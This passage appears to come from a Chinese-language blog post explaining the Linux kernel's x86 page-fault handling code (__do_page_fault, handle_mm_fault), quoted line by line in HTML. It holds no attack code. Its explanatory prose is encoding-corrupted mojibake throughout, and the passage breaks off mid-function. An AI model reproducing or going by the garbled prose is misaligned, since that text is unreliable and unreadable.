class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br><span class="line"></span><br><span class="line">	tsk = current;</span><br><span class="line">	mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment">	 * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">		kmemcheck_hide(regs);</span><br><span class="line">	prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment">	 * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment">	 * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment">	 * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment">	 * nothing more.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment">	 * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment">	 * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line">		<span class="keyword">if</span> (spurious_fault(error_code, address))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">		<span class="keyword">if</span> (kprobes_fault(regs))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment">		 * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(kprobes_fault(regs)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">		pgtable_bad(regs, error_code, address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment">	 * in a region with pagefaults disabled then we must not take the fault</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">		bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the</span></span><br><span class="line"><span class="comment">	 * vmalloc fault has been handled.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * User-mode registers count as a user access even for any</span></span><br><span class="line"><span class="comment">	 * potential system fault or CPU buglet:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">		local_irq_enable();</span><br><span class="line">		error_code |= PF_USER;</span><br><span class="line">		flags |= FAULT_FLAG_USER;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">			local_irq_enable();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, <span class="number">1</span>, regs, address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">		flags |= FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When running in the kernel we expect faults to occur only to</span></span><br><span class="line"><span class="comment">	 * addresses in user space.  All other faults represent errors in</span></span><br><span class="line"><span class="comment">	 * the kernel and should generate an OOPS.  Unfortunately, in the</span></span><br><span class="line"><span class="comment">	 * case of an erroneous fault occurring in a code path which already</span></span><br><span class="line"><span class="comment">	 * holds mmap_sem we will deadlock attempting to validate the fault</span></span><br><span class="line"><span class="comment">	 * against the address space.  Luckily the kernel only validly</span></span><br><span class="line"><span class="comment">	 * references user space from well defined areas of code, which are</span></span><br><span class="line"><span class="comment">	 * listed in the exceptions table.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * As the vast majority of faults will be valid we will only perform</span></span><br><span class="line"><span class="comment">	 * the source reference check when there is a possibility of a</span></span><br><span class="line"><span class="comment">	 * deadlock. Attempt to lock the address space, if we cannot we then</span></span><br><span class="line"><span class="comment">	 * validate the source. If this is invalid we can skip the address</span></span><br><span class="line"><span class="comment">	 * space check, thus avoiding the deadlock:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">		    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">			bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The above down_read_trylock() might have succeeded in</span></span><br><span class="line"><span class="comment">		 * which case we&#x27;ll have missed the might_sleep() from</span></span><br><span class="line"><span class="comment">		 * down_read():</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		might_sleep();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma = find_vma(mm, address);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">		bad_area(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">		<span class="keyword">goto</span> good_area;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">		bad_area(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Accessing the stack below %sp is always a bug.</span></span><br><span class="line"><span class="comment">		 * The large cushion allows instructions like enter</span></span><br><span class="line"><span class="comment">		 * and pusha to work. (&quot;enter $65535, $31&quot; pushes</span></span><br><span class="line"><span class="comment">		 * 32 pointers and then decrements %sp by 65535.)</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">			bad_area(regs, error_code, address);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">		bad_area(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we have a good vm_area for this memory access, so</span></span><br><span class="line"><span class="comment">	 * we can handle it..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">good_area:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">		bad_area_access_error(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If for any reason at all we couldn&#x27;t handle the fault,</span></span><br><span class="line"><span class="comment">	 * make sure we exit gracefully rather than endlessly redo</span></span><br><span class="line"><span class="comment">	 * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if</span></span><br><span class="line"><span class="comment">	 * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">	major |= fault &amp; VM_FAULT_MAJOR;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we need to retry the mmap_sem has already been released,</span></span><br><span class="line"><span class="comment">	 * and if there is a fatal signal pending there is no guarantee</span></span><br><span class="line"><span class="comment">	 * that we made any progress. Handle this case first.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">		<span class="comment">/* Retry at most once */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">			flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">			flags |= FAULT_FLAG_TRIED;</span><br><span class="line">			<span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* User mode? Just return to handle the fatal exception */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Not returning to user mode? Handle exceptions or die: */</span></span><br><span class="line">		no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;</span><br><span class="line">		mm_fault_error(regs, error_code, address, fault);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Major/minor page fault accounting. If any of the events</span></span><br><span class="line"><span class="comment">	 * returned VM_FAULT_MAJOR, we account it as a major fault.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (major) &#123;</span><br><span class="line">		tsk-&gt;maj_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		tsk-&gt;min_flt++;</span><br><span class="line">		perf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, <span class="number">1</span>, regs, address);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_v8086_mode(regs, address, tsk);</span><br><span class="line">&#125;</span><br><span class="line">NOKPROBE_SYMBOL(__do_page_fault);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆéœ€è¦çŸ¥é“çš„æ˜¯<code>vma</code>è¡¨ç¤ºçš„æ˜¯çº¿æ€§åŒºæè¿°ç¬¦ï¼Œ<code>tsk</code>è¡¨ç¤ºçš„æ˜¯å¾ˆç†Ÿæ‚‰çš„<code>task_struct</code>,<code>mm</code>ä¹Ÿæ˜¯å‰é¢æ–‡ç« ä¸­æåˆ°è¿‡çš„<code>mm_struct</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡è¿™æ ·ä¸€æ¡è¯­å¥åˆå§‹åŒ–flagsï¼Œéšååˆå§‹åŒ–ä¸Šè¿°çš„å˜é‡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¿™æ¡è¯­å¥ä»¥åŠéªŒè¯<code>error_code</code>åˆ¤æ–­ç¼ºé¡µå¼‚å¸¸æ˜¯å¦å‘ç”Ÿåœ¨å†…æ ¸ç©ºé—´ï¼Œè€Œ<code>PF_RSVD | PF_USER | PF_PROT</code>çš„å«ä¹‰åˆ†åˆ«è¡¨ç¤º<code>é¡µè¡¨é¡¹ä¿ç•™ ï½œ ç”¨æˆ·é¡µå¼‚å¸¸ ï½œ é¡µä¿æŠ¤å¼‚å¸¸</code>ã€‚å¦‚æœåˆ¤æ–­ç»“æœè®¤å®šä¸ºå†…æ ¸åœ°å€ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µåˆ™ä½¿ç”¨<code>vmalloc_fault(address)</code>è¿›è¡Œå¤„ç†ã€‚</p>
<p>éšåè¿˜æ˜¯ä¸»è¦åˆ†æç”¨æˆ·æ€çš„ç¼ºé¡µå¼‚å¸¸ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">		pgtable_bad(regs, error_code, address);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä½¿ç”¨äº†é¡µè¡¨é¡¹ä¿ç•™çš„æ ‡è¯†ä½åˆ™ä»£è¡¨æ˜¯é¡µè¡¨é”™è¯¯å¹¶è¿›è¡Œå¤„ç†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ­¥åˆ™æ˜¯éªŒè¯æ˜¯å¦å‡ºå‘äº†<code>smap</code>ä¿æŠ¤ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(faulthandler_disabled() || !mm)) &#123;</span><br><span class="line">  bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒéªŒè¯äº†æ—¶å€™å¼€å¯äº†ç¼ºé¡µä¸å¤„ç†æˆ–è€…æ˜¯ä¸å­˜åœ¨ç”¨æˆ·ç©ºé—´ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user_mode(regs)) &#123;</span><br><span class="line">  local_irq_enable();</span><br><span class="line">  error_code |= PF_USER;</span><br><span class="line">  flags |= FAULT_FLAG_USER;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (regs-&gt;flags &amp; X86_EFLAGS_IF)</span><br><span class="line">    local_irq_enable();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­å¯„å­˜å™¨å‘ç”Ÿç¼ºé¡µæ—¶æ˜¯å¦ä¸ºç”¨æˆ·æ€å¯„å­˜å™¨ï¼Œç´§æ¥ç€å‘é€ç»ˆç«¯è¯·æ±‚ï¼Œç„¶åè®¾ç½®<code>error_code</code>å’Œ<code>flags</code>ä¸ºç”¨æˆ·ç©ºé—´å‘ç”Ÿçš„ç¼ºé¡µã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error_code &amp; PF_WRITE)</span><br><span class="line">  flags |= FAULT_FLAG_WRITE;</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­æ˜¯å¦æ˜¯åœ¨å†™çš„æ—¶å€™å‘ç”Ÿçš„ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™ç»™flagsæ·»åŠ ç›¸åº”çš„æ ‡è¯†ä½ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((error_code &amp; PF_USER) == <span class="number">0</span> &amp;&amp; </span><br><span class="line">		    !search_exception_tables(regs-&gt;ip)) &#123;</span><br><span class="line">			bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		might_sleep();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>éšåå¯¹<code>mm_struct</code>ä¸Šé”ï¼Œå¦‚æœä¸Šé”å¤±è´¥å¹¶ä¸”å‘ç°æ˜¯å†…æ ¸ç©ºé—´çš„å¼‚å¸¸åˆ™æ€æ­»è¿›ç¨‹ï¼ŒæˆåŠŸåˆ™ç»§ç»­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vma = find_vma(mm, address);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!vma)) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_start &lt;= address))</span><br><span class="line">  <span class="keyword">goto</span> good_area;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (error_code &amp; PF_USER) &#123;</span><br><span class="line">  <span class="keyword">if</span> (unlikely(address + <span class="number">65536</span> + <span class="number">32</span> * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) &lt; regs-&gt;sp)) &#123;</span><br><span class="line">    bad_area(regs, error_code, address);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (unlikely(expand_stack(vma, address))) &#123;</span><br><span class="line">  bad_area(regs, error_code, address);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œåˆ™æ˜¯æœçº¿æœç´¢åˆ°åœ°å€å¯¹åº”çš„vmaï¼Œå¦‚æœvmaä¸å­˜åœ¨åˆ™æ€æ­»è¿›ç¨‹ã€‚å¦‚æœä½¿ç”¨çš„çº¿æ€§åœ°å€å¤§äº<code>vma-&gt;vm_start</code>åˆ™è¿›å…¥<code>good_area</code>ã€‚å¦‚æœä¸æ˜¯åˆ™è¿›å…¥ä¸‹ä¸€ä¸ªifï¼Œåˆ¤æ–­å½“å‰çš„vmaæ˜¯å¦ä¸ºå †æ ˆåŒºï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥æ€æ­»è¿›ç¨‹ã€‚ç´§æ¥ç€éªŒè¯æ˜¯å¦ä¸ºç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µï¼Œå¦‚æœæ˜¯åˆ™ç´§æ¥ç€æ˜¯å¯¹æ ˆçš„ä¸€ä¸ªåˆ¤æ–­ã€‚åç»­åˆ™æ˜¯å¢é•¿çº¿æ€§åŒºï¼Œå¦‚æœå¤±è´¥ä¹Ÿæ€æ­»è¿›ç¨‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">good_area:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">		bad_area_access_error(regs, error_code, address);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line">	major |= fault &amp; VM_FAULT_MAJOR;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œåˆ°è¿™é‡Œå…ˆæ˜¯åˆ¤æ–­ä¸€ä¸‹<code>error_code</code>ä¸vmaæ˜¯å¦å†²çªï¼Œå¦‚æœä¸å†²çªåˆ™è¿›å…¥åˆ†é…ç‰©ç†é¡µçš„æ ¸å¿ƒå‡½æ•°<code>handle_mm_fault</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;</span><br><span class="line">    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">    flags |= FAULT_FLAG_TRIED;</span><br><span class="line">    <span class="keyword">if</span> (!fatal_signal_pending(tsk))</span><br><span class="line">      <span class="keyword">goto</span> retry;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; FAULT_FLAG_USER)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦éœ€è¦å……å®ï¼Œå¦‚æœéœ€è¦é‡è¯•ï¼Œé‚£ä¹ˆè¿›ä¸€æ­¥åˆ¤æ–­åœ¨å¼€å§‹åˆå§‹åŒ–çš„flagsä¸­æ˜¯å¦åŒ…å«æ ‡å¿—ä½<code>FAULT_FLAG_ALLOW_RETRY</code>ï¼Œå¦‚æœæœ‰çš„è¯åˆ™è¿›è¡Œå……å®ï¼Œå¹¶ä¸”æ“¦å‡ºæ‰flagsä¸­çš„å…è®¸å……å®æ ‡è¯†ä¸ºï¼Œå¹¶ä¸”æ·»åŠ <code>FAULT_FLAG_TRIED</code>æ ‡å¿—ä½ã€‚</p>
<h4 id="handle-mm-fault"><a href="#handle-mm-fault" class="headerlink" title="handle_mm_fault"></a><strong>handle_mm_fault</strong></h4><p>è¿™ä¸ªå‡½æ•°çš„ä¸­çš„çœŸæ­£å¤„ç†å‡½æ•°å…¶å®æ˜¯<code>__handle_mm_fault</code>ï¼Œæ‰€ä»¥ç›´æ¥çœ‹å…¶ä¸­çš„è¿™ä¸ªå‡½æ•°å§ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,</span><br><span class="line">			     <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">pgd_t</span> *pgd;</span><br><span class="line">	<span class="keyword">pud_t</span> *pud;</span><br><span class="line">	<span class="keyword">pmd_t</span> *pmd;</span><br><span class="line">	<span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line">		<span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">	pgd = pgd_offset(mm, address);</span><br><span class="line">	pud = pud_alloc(mm, pgd, address);</span><br><span class="line">	<span class="keyword">if</span> (!pud)</span><br><span class="line">		<span class="keyword">return</span> 